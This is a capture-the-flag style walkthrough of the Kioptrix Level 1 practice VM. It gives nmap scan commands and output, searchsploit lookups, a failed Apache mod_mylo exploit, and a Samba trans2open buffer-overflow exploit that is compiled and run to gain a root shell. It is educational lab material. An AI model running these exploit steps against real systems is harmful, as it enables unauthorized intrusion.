---
title: VulnHub - Kioptrix 1
categories: [Walkthrough]
tags: [VulnHub]
---

## Before we start
Kioptrix Level 1 is one of the earliest beginner-focused vulnerable virtual machines released on VulnHub (first published 2010 by the Kioptrix author), which can be downloaded from this [link](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/).
Since I only have one physical machine, there are some changes needed to be done. The default setting of network adapter is bridged. To make it reachable to our Kali Linux VM, we need to change it to NAT mode(I suggest nat here cus we will download codes on kali later).

Firstly, find out the following line in `Kioptrix Level 1.vmx`:
```text
ethernet0.connectionType = "bridged"
```
and change it to :
```text
// If no present, simply add it
// Or set network adapter to NAT in Vmware GUI
ethernet0.connectionType = "nat"
```
Then we need to make sure nothing causes conflicts, which may look like following:
```text
// Delete the line
ethernet0.networkName = "Bridged"
```
Now the image should be ready to go(Click "I copied" if Vmware prompt something when powered on).


## The Hack: Intelligence Gathering
The only thing we know for now is that both kioptrix 1 and kali are under same subnet `VMnet8`. On my host machine it's `192.168.71.1/24`.

Let's do a scan to see if we can get IP address.
```bash
# Low rate prevents my poor device from explosion ;-)
nmap 192.168.71.1/24 -sn --min-rate 2222 -r
```
Among all printed results, this one is likely to be our target.
```text
MAC Address: 00:50:56:E3:FC:6B (VMware)
Nmap scan report for 192.168.71.137
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 26.58 seconds
```

The next thing we want to do is run an nmap scan to check for any open ports and probe for running services on the VM.
```bash
# Don't forget to save the results
mkdir nmap_results
# A little bit higher rate is helpful for single target
nmap 192.168.71.139 -p- --min-rate 8888 -r -PN -sS -oA nmap_results/port_scan
```

```text
Nmap scan report for 192.168.71.139
Host is up (0.075s latency).
Not shown: 45793 closed tcp ports (reset), 19737 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
139/tcp open  netbios-ssn
443/tcp open  https
MAC Address: 00:0C:29:7C:3A:16 (VMware)
```

To make the result usable(extract port number from nmap report)
```bash
cat ./nmap_results/port_scan.nmap | grep open | awk -F '/' '{print $1}' | tr '\n' ','
```
With specific ports, we can scan more detailed info.
```bash
nmap 192.168.71.139 -p 22,80,111,139,443,1024 -sV -sC -O --version-all -oA nmap_results/server_info
```
A simple explain about the options:  
- -sV — probe open ports to detect service name and version.

- -sC — run the default set of NSE (Nmap Scripting Engine) scripts against the target.

- -O — attempt OS detection.

- --version-all — be exhaustive about version detection (try all version probes).

```text
Nmap scan report for 192.168.71.139
Host is up (0.0010s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1026/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2025-09-27T08:35:12+00:00; +1m49s from scanner time.
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:7C:3A:16 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 1m48s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Some key info we can refer from the result:
	1. OpenSSH version is extremely old - may be vulnerable
	
	2. Apache version is old as well - worth to try
	
	3. There's SMB service, which often considered vulnerable - worth to try


## The Hack: Attack
Let's run scan script to confirm our guesses.
```bash
nmap 192.168.71.139 -p 22,80,111,139,443,1024 --script=vuln -oA nmap_results/vuln_info
```

```text
Nmap scan report for 192.168.71.139
Host is up (0.0014s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-trace: TRACE is enabled
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
|_  /test.php: Test page
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
| ssl-poodle:
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
| ssl-dh-params:
|   VULNERABLE:
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  BID:74733  CVE:CVE-2015-4000
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://www.securityfocus.com/bid/74733
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|       https://weakdh.org
|
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection:
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
1024/tcp open  kdm
MAC Address: 00:0C:29:7C:3A:16 (VMware)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
| smb-vuln-cve2009-3103:
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
```

Clearly, MITM is not the thing we are looking for. Based on what we got, I decided to try it in this order: "Apache" -> "SMB" -> "SSH".  
Although we have "CVE-2009-3103" in scan results, I still want to try Apache first.


We can do a quick search about Apache.
```bash
searchsploit Apache 1.3
```
Among the result, this one is quite interesting(Remote Code Execution).
```text
Apache 1.3.x mod_mylo - Remote Code Execution                                         | multiple/remote/67.c
```
Let's try it
```bash
# To download the source code
searchsploit Apache -m 67
```
The code seems old and failed to compile with my `gcc`, let's fix it by adding 
```c
#include <stdlib.h>
```
and `int` before `main` function
```c
int main(int argc, char **argv) {
//snippet ...
```
**Please note:** These modifications are based on error messages, and may be different on your device.


We can now try it with compiled outcome `a.out`
```bash
./a.out -h
```
```text
Apache + mod_mylo remote exploit
By Carl Livitt (carllivitt at hush dot com)

Arguments:
  -t target       Attack 'target' host
  -T platform     Use parameters for target 'platform'
  -h              This help.

Available platforms:
 0. SuSE 8.1, Apache 1.3.27 (installed from source) (default)
 1. RedHat 7.2, Apache 1.3.20 (installed from RPM)
 2. RedHat 7.3, Apache 1.3.23 (installed from RPM)
 3. FreeBSD 4.8, Apache 1.3.27 (from Ports)
```
```bash
# Try it on our target
./a.out -t 192.168.71.139 -T 1
```

```text
[-] Attempting attack [ RedHat 7.2, Apache 1.3.20 (installed from RPM) ] ...
[*] Bruteforce failed....

Have a nice day!
```
Oh no, our attempt failed!

But don't worry, we still have plan B.

## The Hack: Plan B - SMB
I took a glance on "CVE-2009-3103". But the source code is python script, which I don't want to try in first place.

Let's search for other exploits
```bash
searchsploit samba
```
Some interesting results
```text
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                            | unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                            | unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                            | unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                            | unix/remote/22471.txt
```
I did a double check in broswer, [this one](https://www.exploit-db.com/exploits/22469) seems match our case.
To download the source code
```bash
# Download source code
searchsploit samba -m 22469
# Compile with gcc
gcc ./22469.c
```
```bash
./a.out -h
```
```text
 [~] 0x333hate => samba 2.2.x remote root exploit [~]
 [~]        coded by c0wboy ~ www.0x333.org       [~]

 Usage : ./a.out [-t target] [-p port] [-h]

        -t      target to attack
        -p      samba port (default 139)
        -h      display this help
```
Let's deploy the attack.
```bash
./a.out -t 192.168.71.139
```

```text
 [~] 0x333hate => samba 2.2.x remote root exploit [~]
 [~]        coded by c0wboy ~ www.0x333.org       [~]

 [-] connecting to 192.168.71.139:139
 [-] stating bruteforce

 [-] testing 0xbfffffff
 [-] testing 0xbffffdff
 [-] testing 0xbffffbff
 [-] testing 0xbffff9ff
 [-] testing 0xbffff7ff
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
^C
```
And there we have it! We exploited Kioptrix 1 with a well-known vulnerability and got root!

## Closing
TBH, this VM is pretty easy in terms of complexity since its main objective was to teach you the basics in tool usage and exploitation.
There's still a long way to go.